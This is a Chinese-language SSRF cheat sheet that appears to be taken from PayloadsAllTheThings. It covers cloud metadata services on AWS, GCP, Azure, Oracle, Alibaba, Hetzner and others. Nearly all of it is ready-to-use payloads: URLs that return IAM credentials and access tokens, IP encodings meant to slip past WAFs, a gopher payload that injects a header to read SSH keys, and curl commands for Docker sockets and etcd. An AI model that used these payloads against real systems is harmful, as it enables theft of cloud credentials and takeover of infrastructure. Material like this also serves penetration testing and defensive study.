# SSRF Cloud Instances - 云环境SSRF

[SEARCH_KEYWORDS]
漏洞类型: SSRF Cloud Instances 云环境服务端请求伪造
攻击类型: Metadata Extraction Credential Theft IAM Key Access Token
关键词: metadata 169.254.169.254 IAM security-credentials user-data instance
云平台: AWS EC2 ECS Lambda Elastic Beanstalk GCP Azure DigitalOcean Oracle Alibaba Hetzner Kubernetes Docker Rancher
端口: 169.254.169.254 100.100.100.200 192.0.0.192 127.0.0.1:2375 127.0.0.1:2379

[CONTENT]

## 云环境SSRF概述

在云环境中利用SSRF时，攻击者通常针对元数据端点获取敏感实例信息（如凭证、配置）。以下是各云厂商的元数据端点URL列表。

## AWS元数据服务

### 端点

- IPv4 (旧): `http://169.254.169.254/latest/meta-data/`
- IPv4 (新): 需要Header `X-aws-ec2-metadata-token`
- IPv6: `http://[fd00:ec2::254]/latest/meta-data/`

### 获取Token

```powershell
export TOKEN=`curl -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" "http://169.254.169.254/latest/api/token"`
curl -H "X-aws-ec2-metadata-token:$TOKEN" -v "http://169.254.169.254/latest/meta-data"
```

### WAF绕过 - IP编码

```powershell
http://425.510.425.510      # Dotted decimal with overflow
http://2852039166           # Dotless decimal
http://0xA9.0xFE.0xA9.0xFE  # Dotted hexadecimal
http://0xA9FEA9FE           # Dotless hexadecimal
http://0251.0376.0251.0376  # Dotted octal
http://[::ffff:a9fe:a9fe]   # IPV6 Compressed
http://[fd00:ec2::254]      # IPV6
```

### 关键端点

```powershell
http://169.254.169.254/latest/meta-data/iam/security-credentials
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
```

## AWS ECS

```powershell
# 先提取 /proc/self/environ 获取UUID
curl http://169.254.170.2/v2/credentials/<UUID>
```

## AWS Elastic Beanstalk

```powershell
# 获取accountId和region
http://169.254.169.254/latest/dynamic/instance-identity/document
# 获取凭证
http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
```

## AWS Lambda

```powershell
http://localhost:9001/2018-06-01/runtime/invocation/next
http://${AWS_LAMBDA_RUNTIME_API}/2018-06-01/runtime/invocation/next
```

## Google Cloud (GCP)

需要Header `Metadata-Flavor: Google` 或 `X-Google-Metadata-Request: True`

```powershell
http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/hostname
http://metadata.google.internal/computeMetadata/v1/project/project-id
```

### 递归获取

```powershell
http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true
```

### Beta端点（无需Header）

```powershell
http://metadata.google.internal/computeMetadata/v1beta1/
http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true
```

### Gopher SSRF设置Header

```powershell
gopher://metadata.google.internal:80/xGET%20/computeMetadata/v1/instance/attributes/ssh-keys%20HTTP%2f%31%2e%31%0AHost:%20metadata.google.internal%0AAccept:%20%2a%2f%2a%0aMetadata-Flavor:%20Google%0d%0a
```

### 关键端点

- SSH公钥: `http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json`
- Access Token: `http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token`
- Kubernetes Key: `http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json`

## Azure

需要Header `Metadata: true`

```powershell
http://169.254.169.254/metadata/v1/maintenance
http://169.254.169.254/metadata/instance?api-version=2017-04-02
http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text
```

## DigitalOcean

```powershell
http://169.254.169.254/metadata/v1.json
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/user-data
http://169.254.169.254/metadata/v1/hostname
```

## Oracle Cloud

```powershell
http://192.0.0.192/latest/
http://192.0.0.192/latest/user-data/
http://192.0.0.192/latest/meta-data/
```

## Alibaba (阿里云)

```powershell
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/instance-id
http://100.100.100.200/latest/meta-data/image-id
```

## Hetzner Cloud

```powershell
http://169.254.169.254/hetzner/v1/metadata
http://169.254.169.254/hetzner/v1/metadata/hostname
http://169.254.169.254/hetzner/v1/metadata/public-ipv4
```

## Kubernetes ETCD

可能包含API密钥和内部IP端口

```powershell
curl -L http://127.0.0.1:2379/version
curl http://127.0.0.1:2379/v2/keys/?recursive=true
```

## Docker

```powershell
http://127.0.0.1:2375/v1.24/containers/json
curl --unix-socket /var/run/docker.sock http://foo/containers/json
curl --unix-socket /var/run/docker.sock http://foo/images/json
```

## Rancher

```powershell
curl http://rancher-metadata/<version>/<path>
```

## 参考文档

原始来源: PayloadsAllTheThings/Server Side Request Forgery/SSRF-Cloud-Instances.md